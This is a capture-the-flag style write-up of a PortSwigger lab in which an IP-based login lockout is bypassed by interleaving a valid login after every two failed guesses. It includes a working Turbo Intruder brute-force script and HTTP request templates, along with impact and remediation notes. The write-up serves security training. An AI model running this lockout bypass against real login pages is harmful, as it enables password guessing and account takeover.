# PortSwigger — Broken Brute-Force Protection, IP Block

## Challenge Overview

| Field           | Details                                                        |
|----------------|----------------------------------------------------------------|
| **Platform**   | [PortSwigger Web Security Academy](https://portswigger.net/web-security) |
| **Lab**        | Broken Brute-Force Protection, IP Block                        |
| **Category**   | Authentication / Brute-Force Protection Bypass                 |
| **Tools Used** | Burp Suite, Turbo Intruder                                     |
| **Difficulty** | Practitioner                                                   |

---

## Lab Description

The lab implements an IP-based brute-force protection mechanism that **blocks the client IP after 3 consecutive failed login attempts**. The goal is to brute-force the password for the user `carlos` using a provided password wordlist.

**Known credentials:**
| Username | Password |
|----------|----------|
| `wiener` | `peter`  |
| `carlos` | `?`      ← target

---

## Vulnerability Explanation

### How the Protection Works

The server tracks **consecutive failed login attempts per IP**. After 3 failures, the IP is blocked from making further login attempts for a period of time.

The critical flaw: the failed attempt **counter resets to zero** after any successful login — regardless of which account successfully logs in.

This means the server is not tracking failed attempts per account — only the **count of consecutive failures from that IP**. A successful login from any valid account resets the window entirely.

### The Logic Flaw

```
Attempt 1: carlos + wrong_password  → ❌ Fail   (counter: 1)
Attempt 2: carlos + wrong_password  → ❌ Fail   (counter: 2)
Attempt 3: wiener + peter           → ✅ Success (counter: RESET to 0)
Attempt 4: carlos + wrong_password  → ❌ Fail   (counter: 1)
Attempt 5: carlos + wrong_password  → ❌ Fail   (counter: 2)
Attempt 6: wiener + peter           → ✅ Success (counter: RESET to 0)
...repeat
```

By interleaving a successful `wiener` login after every **2 failed attempts** for `carlos`, the counter never reaches 3 — and the IP is never blocked.

---

## Tool — Burp Suite Turbo Intruder

**Turbo Intruder** is a Burp Suite extension designed for high-speed, highly customizable HTTP request attacks. Unlike the standard Intruder, it uses a Python-based scripting engine (`queueRequests` / `handleResponse`) to give full control over request ordering, timing, and concurrency.

### Why Turbo Intruder Over Standard Intruder?

| Factor | Burp Intruder | Turbo Intruder |
|--------|--------------|----------------|
| Request ordering | Fixed sequential | Fully scriptable |
| Speed | Rate-limited (Community) | High speed |
| Custom logic | ❌ No | ✅ Yes |
| Interleaving requests | ❌ Too slow | ✅ Yes |

Standard Intruder cannot interleave two different request types in a custom pattern — Turbo Intruder was the right tool here.

### Why `concurrentConnections=1`?

Setting `concurrentConnections=1` ensures requests are sent **strictly one at a time**, in the exact order they are queued. With multiple connections, the server might receive requests out of order — a `wiener` reset could arrive before a `carlos` attempt, breaking the pattern and potentially triggering the block.

---

## Solution

### Request Setup

The main request template (pasted in the top window of Turbo Intruder) was the `carlos` login POST request with the password field as the injection point (`%s`):

```
POST /login HTTP/2
Host: 0ac300dc04f4b2cc80f0df7f00fa00f4.web-security-academy.net
Cookie: session=<your_session_cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=carlos&password=%s
```

### Turbo Intruder Script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # Hardcoded wiener reset request — sent after every 2 carlos attempts
    wiener_request = '''POST /login HTTP/2
Host: 0ac300dc04f4b2cc80f0df7f00fa00f4.web-security-academy.net
Cookie: session=V2tKqV4MrGmxOaT9YAVZzXBBvF9g2OST
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=wiener&password=peter'''

    passwords = wordlists.clipboard

    for i, password in enumerate(passwords):
        # Queue a carlos attempt with the current password
        engine.queue(target.req, password)

        # After every 2 carlos attempts, queue a wiener reset
        if (i + 1) % 2 == 0:
            engine.queue(wiener_request)


def handleResponse(req, interesting):
    # Log every response to the results table for review
    table.add(req)
```

### How It Works — Step by Step

1. **`concurrentConnections=1`** — enforces strict sequential ordering so requests hit the server exactly as queued
2. **The loop** iterates through the password wordlist, queuing one `carlos` attempt per iteration
3. **`(i + 1) % 2 == 0`** — every 2nd iteration, a `wiener:peter` login is queued immediately after
4. **The server sees:** `Fail → Fail → Success → Fail → Fail → Success...` — the counter never reaches 3
5. **`handleResponse`** logs all responses to the table — the successful `carlos` login stands out as a **302 redirect** or a different response length

### Reading the Results

In the results table, look for:

- `carlos` attempts returning a **302 redirect** (successful login) instead of a 200 with an error message
- A noticeably **different response length** compared to failed attempts
- That response's password value is the correct password for `carlos`

---

## Attack Flow Summary

```
Identify IP block mechanism    →  Blocks after 3 consecutive failures
         ↓
Find the logic flaw            →  Counter resets on ANY successful login
         ↓
Strategy                       →  2 carlos attempts → 1 wiener reset → repeat
         ↓
Tool selection                 →  Turbo Intruder (custom request interleaving)
         ↓
Set concurrentConnections=1    →  Guarantees strict request ordering
         ↓
Script the pattern             →  queue(carlos) → queue(carlos) → queue(wiener)
         ↓
Run & read results             →  302 redirect = correct password found ✅
```

---

## Impact

This vulnerability demonstrates that **rate limiting on a mutable, shared counter is not sufficient** brute-force protection. The real-world implications:

- An attacker with one valid account can bypass IP-based lockout entirely
- Account takeover of any targeted user becomes feasible given a sufficient wordlist
- The protection gives a false sense of security — it appears to work but is trivially bypassed

---

## Remediation

| Action | Details |
|--------|---------|
| **Lock per account, not per IP** | Track failed attempts tied to the target username, not the source IP |
| **CAPTCHA after N failures** | Introduce a CAPTCHA challenge after 3–5 failed attempts for any account |
| **Account lockout** | Temporarily lock the `carlos` account after repeated failures, regardless of source IP |
| **Multi-factor authentication** | Render password brute-force irrelevant by requiring a second factor |
| **Anomaly detection** | Flag and alert on high volumes of login attempts across multiple accounts from one IP |
| **Do not allow counter reset on cross-account success** | A successful login for `wiener` should not reset the failure counter for `carlos` |

---

## What I Learned

- **IP-based rate limiting is only as strong as the logic that resets it** — if a successful login from any account clears the counter, the protection is broken
- **Turbo Intruder's scripting engine** gives precise control over request ordering that standard Burp Intruder cannot provide
- **`concurrentConnections=1` is critical** for order-dependent attacks — parallel connections break sequencing
- **`(i + 1) % 2 == 0`** is a clean way to interleave a reset request every N attempts
- **Success detection in brute-force** is done by comparing response codes or lengths — a 302 redirect stands out from 200 error responses
- **Logic flaws in authentication** are often more exploitable than technical vulnerabilities — the code worked exactly as written, the design was the flaw

---

## References

- [PortSwigger — Broken Brute-Force Protection, IP Block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
- [PortSwigger — Turbo Intruder Documentation](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [PortSwigger — Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
